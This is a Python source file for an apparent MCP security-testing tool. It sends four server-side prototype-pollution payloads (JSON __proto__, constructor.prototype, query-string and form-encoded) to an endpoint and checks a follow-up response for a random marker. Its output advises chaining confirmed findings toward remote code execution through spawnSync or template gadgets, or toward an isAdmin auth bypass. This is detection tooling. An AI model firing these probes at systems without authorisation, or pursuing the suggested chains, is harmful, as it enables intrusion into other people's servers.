"""test_prototype_pollution — server-side prototype-pollution detection via
HTTP traffic patterns.

The pollution itself happens server-side (Node.js merge / Object.assign /
Lodash _.merge / set / cloneDeep gadgets). Detection works by injecting
`__proto__.X = Y` or `constructor.prototype.X = Y` and observing whether
property X subsequently appears in unrelated responses, error messages, or
behaviour changes.

This tool fires four payload shapes against one endpoint and watches for
reflection / behavioral deltas on a follow-up request.

  §1 JSON body pollution    {"__proto__": {"polluted": "<marker>"}}
  §2 Constructor.prototype  {"constructor": {"prototype": {"polluted": "<marker>"}}}
  §3 Query-string flat      ?__proto__[polluted]=<marker>
  §4 Form-encoded body      __proto__[polluted]=<marker>

Then it re-fetches the endpoint with a clean request and checks whether
"polluted" / the marker appears anywhere in the second response (object
default leakage = strong PP signal).

No good third-party for server-side detection over HTTP — PPScan / ppfuzz
focus on the client side.
"""

from __future__ import annotations

import secrets
import string
from urllib.parse import urlparse, urlunparse, urlencode

from mcp.server.fastmcp import FastMCP

from ._send import send_probe


def _marker() -> str:
    """Per-call marker so reflection detection isn't fooled by other tests."""
    suffix = "".join(secrets.choice(string.ascii_lowercase + string.digits)
                     for _ in range(8))
    return f"ppm{suffix}"


def register(mcp: FastMCP):

    @mcp.tool()
    async def test_prototype_pollution(  # cost: low (~6 requests)
        url: str,
        method: str = "POST",
        cookies: dict | None = None,
        bearer_token: str = "",
        follow_up_path: str = "",
    ) -> str:
        """Test for server-side prototype pollution.

        Args:
            url: Endpoint that accepts JSON / form body (or query)
            method: POST / PUT / PATCH (default POST)
            cookies: Session cookies
            bearer_token: Optional bearer
            follow_up_path: URL to fetch AFTER pollution to check for marker
                reflection (default = same url with GET)
        """
        marker = _marker()
        parsed = urlparse(url)
        follow_url = follow_up_path or urlunparse(parsed._replace(query=""))

        lines = [f"test_prototype_pollution {method} {url}  marker={marker}\n"]
        bypasses: list[str] = []

        # Baseline GET on the follow-up URL — marker should NOT appear yet.
        base = await send_probe("GET", follow_url, {}, cookies=cookies,
                                bearer=bearer_token)
        if "error" in base:
            return f"Error (baseline): {base['error']}"
        base_body = (base.get("response_body", "") or "")
        if marker in base_body:
            return ("Error: baseline already contains marker — should be "
                    "impossible (marker is per-call random). Retry.")

        async def _send_payload(label: str, json_body: dict | None = None,
                                body: str = "",
                                ct: str = "application/json",
                                url_override: str = "") -> dict:
            headers = {"Content-Type": ct} if not json_body else {}
            target = url_override or url
            return await send_probe(method, target, headers,
                                    body=body, json_body=json_body,
                                    cookies=cookies, bearer=bearer_token)

        # §1 JSON __proto__
        r1 = await _send_payload(
            "§1 json __proto__",
            json_body={"__proto__": {"polluted": marker}})
        s1 = r1.get("status_code", 0) if "error" not in r1 else "ERR"
        idx1 = r1.get("history_index", -1) if "error" not in r1 else -1
        lines.append(f"  §1 json __proto__:                {s1} (#{idx1})")

        # §2 constructor.prototype
        r2 = await _send_payload(
            "§2 constructor.prototype",
            json_body={"constructor": {"prototype": {"polluted": marker}}})
        s2 = r2.get("status_code", 0) if "error" not in r2 else "ERR"
        idx2 = r2.get("history_index", -1) if "error" not in r2 else -1
        lines.append(f"  §2 constructor.prototype:        {s2} (#{idx2})")

        # §3 Query string flat
        sep = "&" if "?" in url else "?"
        q_target = f"{url}{sep}{urlencode({'__proto__[polluted]': marker})}"
        r3 = await _send_payload("§3 qs", url_override=q_target,
                                 body="", ct="application/x-www-form-urlencoded")
        s3 = r3.get("status_code", 0) if "error" not in r3 else "ERR"
        idx3 = r3.get("history_index", -1) if "error" not in r3 else -1
        lines.append(f"  §3 qs ?__proto__[polluted]=...:   {s3} (#{idx3})")

        # §4 Form-encoded body
        r4 = await _send_payload(
            "§4 form __proto__",
            body=f"__proto__[polluted]={marker}",
            ct="application/x-www-form-urlencoded")
        s4 = r4.get("status_code", 0) if "error" not in r4 else "ERR"
        idx4 = r4.get("history_index", -1) if "error" not in r4 else -1
        lines.append(f"  §4 form __proto__[polluted]=...:  {s4} (#{idx4})")

        # Follow-up GET — does the marker leak into a clean response?
        follow = await send_probe("GET", follow_url, {}, cookies=cookies,
                                  bearer=bearer_token)
        if "error" in follow:
            lines.append(f"\n  Follow-up: ERROR {follow['error']}")
        else:
            f_body = (follow.get("response_body", "") or "")
            f_idx = follow.get("history_index", -1)
            f_status = follow.get("status_code", 0)
            lines.append(f"\n  Follow-up GET {follow_url}: {f_status} (#{f_idx})")

            if marker in f_body:
                lines.append(f"  *** REFLECTION HIT *** marker {marker!r} "
                             f"present in follow-up response body — "
                             f"prototype pollution CONFIRMED")
                bypasses.append(
                    f"prototype pollution: marker {marker!r} leaked to "
                    f"follow-up GET (#{f_idx})")
            elif '"polluted"' in f_body or "polluted:" in f_body:
                lines.append(f"  [?] WEAK SIGNAL: 'polluted' key visible in "
                             f"follow-up — marker value differs (might be "
                             f"sanitized but key still merged)")
                bypasses.append(
                    f"prototype pollution (key-only): 'polluted' in follow-up "
                    f"(#{f_idx})")
            else:
                # Behavioural check: response length / status delta from
                # baseline pre-pollution.
                base_len = base.get("response_length", 0)
                f_len = follow.get("response_length", 0)
                if abs(base_len - f_len) > max(50, base_len * 0.1):
                    lines.append(
                        f"  [?] Length delta: baseline {base_len}b vs "
                        f"follow-up {f_len}b — pollution may have changed "
                        f"server defaults")

        lines.append("")
        if bypasses:
            lines.append(f"FINDINGS ({len(bypasses)}):")
            for b in bypasses:
                lines.append(f"  - {b}")
            lines.append("")
            lines.append("Save guidance:")
            lines.append("  vuln_type='prototype_pollution' severity='high'")
            lines.append("  Chain with downstream gadget for RCE: "
                         "exec lookups (childProcess.spawnSync), template "
                         "render (handlebars compile), or auth bypass "
                         "(isAdmin default check).")
        else:
            lines.append("No prototype pollution signal. Endpoint may not "
                         "merge user input into objects, OR the polluted "
                         "property doesn't reflect into the follow-up route — "
                         "try a different follow_up_path that consumes default "
                         "object values (config endpoint, render endpoint, "
                         "auth-check endpoint).")

        return "\n".join(lines)
